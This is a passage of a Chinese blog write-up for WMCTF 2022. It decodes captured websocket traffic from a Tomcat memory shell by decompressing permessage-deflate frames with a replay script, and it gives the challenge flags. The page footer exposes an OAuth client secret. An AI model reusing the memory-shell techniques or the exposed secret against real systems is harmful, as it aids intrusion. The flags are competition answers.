src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661087656182-e995cef2-5ad0-4f1a-97c4-80c88fa9a329.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=554&amp;id=u78e364e2&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=693&amp;originWidth=947&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=60990&amp;status=done&amp;style=none&amp;taskId=uf0b131d7-2eae-4c27-b090-652e18c2778&amp;title=&amp;width=757.6" alt="图片.png"></a></p>
<h1 id="MISC">MISC<a class="post-anchor" href="#MISC"></a></h1><h3 id="Hacked-by-L1near">Hacked_by_L1near<a class="post-anchor" href="#Hacked-by-L1near"></a></h3><p>一血</p>
<figure class="highlight"><table><tbody><tr><td class="code"><pre><code class="hljs python">L1near大黑客趁我睡觉的时候给我的tomcat服务器上了个websocket的内存马呜呜呜，还往服务器里写了一个flag，但是我这只抓到了websocket通信期间的流量，你能知道L1near大黑客写的flag是什么吗？<br>L1near hacker put a websocket memory on my tomcat server while I was sleeping, and wrote a flag to the server, but I only captured the traffic during websocket communication, you can know L1near What is the flag written?<br>Attachment:<br>China: https://pan.baidu.com/s/144Cl2IlzMfUEa-niGvKZAg 提取码: pdva<br>Other regions: https://drive.google.com/file/d/1wRHzI6sfwM7Mkw2QjcAEgxBL_5hEwK0m/view?usp=sharing<br></code></pre></td></tr></tbody></table></figure>
<p>根据题目描述 这肯定是最近<a target="_blank" rel="noopener" href="https://github.com/veo">veo</a>开源的那个ws内存马<br><a target="_blank" rel="noopener" href="https://github.com/veo/wsMemShell">https://github.com/veo/wsMemShell</a><br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661087933487-7c465689-092e-47de-b303-ef3cf3514316.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=589&amp;id=ud89d2032&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=736&amp;originWidth=1524&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=1143582&amp;status=done&amp;style=none&amp;taskId=u557ea183-cfc8-49c1-a884-090c2246bb2&amp;title=&amp;width=1219.2" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661087933487-7c465689-092e-47de-b303-ef3cf3514316.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=589&amp;id=ud89d2032&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=736&amp;originWidth=1524&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=1143582&amp;status=done&amp;style=none&amp;taskId=u557ea183-cfc8-49c1-a884-090c2246bb2&amp;title=&amp;width=1219.2" alt="图片.png"></a>大部分数据包以C1 开头 这的确是ws流量<br>这个内存马并没有加密流量的功能 为什么题目的流量不是明文呢?</p>
<h4 id="permessage-deflate">permessage-deflate<a class="post-anchor" href="#permessage-deflate"></a></h4><p>ws流量的压缩<br>阅读ws相关的rfc 我发现了ws有一个 支持压缩的特性<br><a target="_blank" rel="noopener" href="https://www.rfc-editor.org/rfc/rfc7692">https://www.rfc-editor.org/rfc/rfc7692</a></p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python"> A Message Compressed Using One Compressed DEFLATE Block<br><br>   Suppose that an endpoint sends a text message <span class="hljs-string">"Hello"</span>.  If the<br>   endpoint uses one compressed DEFLATE block (compressed <span class="hljs-keyword">with</span> fixed<br>   Huffman code <span class="hljs-keyword">and</span> the <span class="hljs-string">"BFINAL"</span> bit <span class="hljs-keyword">not</span> <span class="hljs-built_in">set</span>) to compress the message,<br>   the endpoint obtains the compressed data to use <span class="hljs-keyword">for</span> the message<br>   payload <span class="hljs-keyword">as</span> follows.<br><br>   The endpoint compresses <span class="hljs-string">"Hello"</span> into one compressed DEFLATE block <span class="hljs-keyword">and</span><br>   flushes the resulting data into a byte array using an empty DEFLATE<br>   block <span class="hljs-keyword">with</span> no compression:<br><br>       <span class="hljs-number">0xf2</span> <span class="hljs-number">0x48</span> <span class="hljs-number">0xcd</span> <span class="hljs-number">0xc9</span> <span class="hljs-number">0xc9</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0xff</span> <span class="hljs-number">0xff</span><br><br>   By stripping <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0xff</span> <span class="hljs-number">0xff</span> <span class="hljs-keyword">from</span> the tail end, the endpoint gets<br>   the data to use <span class="hljs-keyword">for</span> the message payload:<br><br>       <span class="hljs-number">0xf2</span> <span class="hljs-number">0x48</span> <span class="hljs-number">0xcd</span> <span class="hljs-number">0xc9</span> <span class="hljs-number">0xc9</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span><br><br>   Suppose that the endpoint sends this compressed message without<br>   fragmentation.  The endpoint builds one frame by putting <span class="hljs-built_in">all</span> of the<br>   compressed data <span class="hljs-keyword">in</span> the payload data portion of the frame:<br><br>       <span class="hljs-number">0xc1</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0xf2</span> <span class="hljs-number">0x48</span> <span class="hljs-number">0xcd</span> <span class="hljs-number">0xc9</span> <span class="hljs-number">0xc9</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span><br><br>   The first <span class="hljs-number">2</span> octets (<span class="hljs-number">0xc1</span> <span class="hljs-number">0x07</span>) are the WebSocket frame header (FIN=<span class="hljs-number">1</span>,<br>   RSV1=<span class="hljs-number">1</span>, RSV2=<span class="hljs-number">0</span>, RSV3=<span class="hljs-number">0</span>, opcode=text, MASK=<span class="hljs-number">0</span>, Payload length=<span class="hljs-number">7</span>).  The<br>   following figure shows what value <span class="hljs-keyword">is</span> <span class="hljs-built_in">set</span> <span class="hljs-keyword">in</span> each field of the<br>   WebSocket frame header.<br><br>        <span class="hljs-number">0</span>                   <span class="hljs-number">1</span><br>        <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br>       +-+-+-+-+-------+-+-------------+<br>       |F|R|R|R| opcode|M| Payload <span class="hljs-built_in">len</span> |<br>       |I|S|S|S|       |A|             |<br>       |N|V|V|V|       |S|             |<br>       | |<span class="hljs-number">1</span>|<span class="hljs-number">2</span>|<span class="hljs-number">3</span>|       |K|             |<br>       +-+-+-+-+-------+-+-------------+<br>       |<span class="hljs-number">1</span>|<span class="hljs-number">1</span>|<span class="hljs-number">0</span>|<span class="hljs-number">0</span>|   <span class="hljs-number">1</span>   |<span class="hljs-number">0</span>|      <span class="hljs-number">7</span>      |<br>       +-+-+-+-+-------+-+-------------+<br><br><br><br><br><br><br>Yoshino                      Standards Track                   [Page <span class="hljs-number">22</span>]<br><br><br>RFC <span class="hljs-number">7692</span>          Compression Extensions <span class="hljs-keyword">for</span> WebSocket     December <span class="hljs-number">2015</span><br><br><br>   Suppose that the endpoint sends the compressed message <span class="hljs-keyword">with</span><br>   fragmentation.  The endpoint splits the compressed data into<br>   fragments <span class="hljs-keyword">and</span> builds frames <span class="hljs-keyword">for</span> each fragment.  For example, <span class="hljs-keyword">if</span> the<br>   fragments are <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-number">4</span> octets, the first frame <span class="hljs-keyword">is</span>:<br><br>       <span class="hljs-number">0x41</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0xf2</span> <span class="hljs-number">0x48</span> <span class="hljs-number">0xcd</span><br><br>   <span class="hljs-keyword">and</span> the second frame <span class="hljs-keyword">is</span>:<br><br>       <span class="hljs-number">0x80</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0xc9</span> <span class="hljs-number">0xc9</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span><br><br>   Note that the RSV1 bit <span class="hljs-keyword">is</span> <span class="hljs-built_in">set</span> only on the first frame.<br><br></code></pre></td></tr></tbody></table></figure>
<p>去掉前两位 flag<br>unmask 之后在末尾加上0x00 0x00 0xff 0xff  就可以使用 zlib解压raw数据<br>这里偷懒编写脚本重放流量 补全缺失的ws会话 塞给一个支持压缩到的ws服务端解析</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> flowcontainer.extractor <span class="hljs-keyword">import</span> extract<br>result = extract(<span class="hljs-string">r"info.pcapng"</span>,<span class="hljs-built_in">filter</span>=<span class="hljs-string">''</span>,extension=[<span class="hljs-string">'tcp.payload'</span>])<br>s = socket.socket()<br>host = <span class="hljs-string">'127.0.0.1'</span><br>port = <span class="hljs-number">8088</span><br><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> result:<br>	<span class="hljs-keyword">try</span>:<br>		s = socket.socket()<br>		s.connect((host,port))<span class="hljs-comment">#http升级ws首包</span><br>		s.send(binascii.unhexlify(<span class="hljs-string">"474554202f6563686f20485454502f312e310d0a486f73743a203132372e302e302e313a383038380d0a557365722d4167656e743a204d6f7a696c6c612f352e30202857696e646f7773204e542031302e303b2057696e36343b207836343b2072763a3130332e3029204765636b6f2f32303130303130312046697265666f782f3130332e300d0a4163636570743a202a2f2a0d0a4163636570742d4c616e67756167653a207a682d434e2c7a683b713d302e382c7a682d54573b713d302e372c7a682d484b3b713d302e352c656e2d55533b713d302e332c656e3b713d302e320d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174652c2062720d0a5365632d576562536f636b65742d56657273696f6e3a2031330d0a4f726967696e3a20687474703a2f2f3132372e302e302e313a383038380d0a5365632d576562536f636b65742d457874656e73696f6e733a207065726d6573736167652d6465666c6174650d0a5365632d576562536f636b65742d4b65793a204b624e4b6f59636a495367797a4c38553977536745513d3d0d0a444e543a20310d0a436f6e6e656374696f6e3a206b6565702d616c6976652c20557067726164650d0a436f6f6b69653a2063737266746f6b656e3d70756d423538564e414c543964624567535450574956414a504d4259454e393152445578485063535367434e37477554386b5564636c334e477a78653567526e3b20636f6d2e776962752e636d2e77656261646d696e2e6c616e673d7a682d434e3b205f67613d4741312e312e313535373634333133362e313635383231343434340d0a5365632d46657463682d446573743a20776562736f636b65740d0a5365632d46657463682d4d6f64653a20776562736f636b65740d0a5365632d46657463682d536974653a2073616d652d6f726967696e0d0a507261676d613a206e6f2d63616368650d0a43616368652d436f6e74726f6c3a206e6f2d63616368650d0a557067726164653a20776562736f636b65740d0a0d0a"</span>))<br>		s.recv(<span class="hljs-number">1024</span>)<span class="hljs-comment">#等待模拟服务器返回</span><br>		value = result[key]<br>		a=value.extension[<span class="hljs-string">'tcp.payload'</span>]<br>		<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> a:<br>			s.send(binascii.unhexlify(c[<span class="hljs-number">0</span>]))<br>			<span class="hljs-keyword">pass</span><br>	<span class="hljs-keyword">except</span>:<br>		<span class="hljs-keyword">continue</span><br>	s.close()<br><span class="hljs-comment">#</span><br></code></pre></td></tr></tbody></table></figure>
<p>使用一个ws模拟服务器接收请求<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661088346540-67e71daf-302f-49d7-ae65-c5ec0d1ebc8a.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=687&amp;id=u623ad603&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=859&amp;originWidth=1223&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=220304&amp;status=done&amp;style=none&amp;taskId=u4131439e-8887-4b1d-9a3b-7191867650d&amp;title=&amp;width=978.4" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661088346540-67e71daf-302f-49d7-ae65-c5ec0d1ebc8a.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=687&amp;id=u623ad603&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=859&amp;originWidth=1223&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=220304&amp;status=done&amp;style=none&amp;taskId=u4131439e-8887-4b1d-9a3b-7191867650d&amp;title=&amp;width=978.4" alt="图片.png"></a>发现解压后的流量是一堆判断每一个字节内容的bash语句<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661088526678-68316d03-5728-45df-8b8a-9ffef9a3b0e0.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=581&amp;id=uc70831d5&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=726&amp;originWidth=1722&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=166818&amp;status=done&amp;style=none&amp;taskId=u2b44a8d0-b8ab-44af-b0e7-c51ac6be33c&amp;title=&amp;width=1377.6" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661088526678-68316d03-5728-45df-8b8a-9ffef9a3b0e0.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=581&amp;id=uc70831d5&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=726&amp;originWidth=1722&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=166818&amp;status=done&amp;style=none&amp;taskId=u2b44a8d0-b8ab-44af-b0e7-c51ac6be33c&amp;title=&amp;width=1377.6" alt="图片.png"></a>匹配返回为1的请求<br>拼接字符串得到flag</p>
<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661088463925-5269c9c7-d691-4327-8e33-1f13b6a88962.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=824&amp;id=u55a12798&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=1030&amp;originWidth=1920&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=149881&amp;status=done&amp;style=none&amp;taskId=u1732dd7b-f3bb-4703-923d-b966936c913&amp;title=&amp;width=1536" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661088463925-5269c9c7-d691-4327-8e33-1f13b6a88962.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=824&amp;id=u55a12798&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=1030&amp;originWidth=1920&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=149881&amp;status=done&amp;style=none&amp;taskId=u1732dd7b-f3bb-4703-923d-b966936c913&amp;title=&amp;width=1536" alt="图片.png"></a><br>(在最后发现最新版wireshark也支持ws解压缩(需要会话完整)  难怪作者会删掉会话头)</p>
<h2 id="Checkin">Checkin<a class="post-anchor" href="#Checkin"></a></h2><p>签到<br>WMCTF{Welcode_wmctf_2022!!!!have_fun!!}</p>
</body></html>

  
  <div class="post-guide">
    <div class="item left">
        
          <a href="/2022/10/18/PWN-BASIC-1/">PWN 入门 (一)</a>
        
    </div>
    <div class="item right">
        
          <a href="/2022/08/17/DUMP-LUKS-KEY-FROM-MEMORY/">LUKS 全盘加密的一个通用解密方法--从内存中提取LUKS MASTER KEY</a>
        
    </div>
  </div>

  

  <div class="post-copyright">
    <div class="auth">
      本文作者：<a href="https://rce.moe">白帽酱</a>
    </div>
    <div class="link">
      永久链接：<a href="https://rce.moe/2022/08/23/WMCTF-2022-WRITEUP/">https://rce.moe/2022/08/23/WMCTF-2022-WRITEUP/</a>
    </div>
    <div class="declare">
      版权声明：本文首发于<a href="https://rce.moe">白帽酱</a>的博客，转载请注明出处！
    </div>
  </div>

  <div id="comment"></div>

  
  
</article>
<div id="gitalk-container"></div>
<link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
<script src="https://priesttomb.github.io/js/md5.min.js"></script>
<script type="text/javascript">
    new Gitalk({
        clientID: '1488ae49eda310270a91',
        clientSecret: '83e505f36d0351b0ef1a225d089546cb40ecd31a',
        repo: 'hexoblog',
        owner: 'burpheart',
        admin: 'burpheart',
        id: md5(location.pathname),
        distractionFreeMode: true,
        proxy: 'https://servelesscors.rce.moe/api/cors?url=https://github.com/login/oauth/access_token'
    }).render('gitalk-container')
</script>
        <footer>
          <div class="copyright">
            ©2022
            <a href="https://rce.moe">白帽酱</a> Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> |
            <a target="_blank" rel="noopener" href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
          </div>
          
        </footer>
      </div>
    </div>
  </body>
  
</html>
<script type="text/javascript">
                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
                </script> <script type="text/javascript">window.addEventListener('load', function() {
    
    window.loadJs = function(d, m, a) {
      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
      var b = document.createElement('script')
      b.defer = true
      b.setAttribute('type', 'text/javascript')
      b.setAttribute('charset', 'UTF-8')
      b.setAttribute('async', 'true')
      b.setAttribute('src', d)
      m && b.setAttribute('data-main', '/scripts/app-built')
      if (typeof a === 'function') {
        if (window.attachEvent) {
          b.onreadystatechange = function() {
            var e = b.readyState
            if (e === 'loaded' || e === 'complete') {
              b.onreadystatechange = null
              a()
            }
          }
        } else {
          b.onload = a
        }
      }
      c.appendChild(b)
    }
    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
  })</script> <script type="text/javascript">
                  ;(function() {
                    var bp = document.createElement('script')
                    var curProtocol = window.location.protocol.split(':')[0]
                    if (curProtocol === 'https') {
                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
                    } else {
                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
                    }
                    var s = document.getElementsByTagName('script')[0]
                    s.parentNode.insertBefore(bp, s)
                  })()
                </script> 
